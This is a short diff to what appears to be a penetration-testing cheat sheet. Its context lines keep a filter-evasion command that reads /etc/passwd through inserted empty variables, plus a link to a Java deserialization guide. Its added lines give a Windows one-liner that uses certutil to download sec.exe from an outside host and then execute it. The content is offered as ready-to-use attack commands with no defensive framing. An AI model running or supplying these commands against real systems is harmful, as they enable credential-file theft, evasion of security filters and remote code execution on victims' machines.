@@ -24,3 +24,10 @@ cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
 ```
 https://medium.com/bugbountywriteup/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64
 ```
+
+
+### cmd download file exec 
+
+```
+cmd.exe /c certutil.exe -urlcache -split -f http://www.sec.com/sec.exe %SystemRoot%/Temp/sec.exe & cmd.exe /c %SystemRoot%/Temp/sec.exe
+```
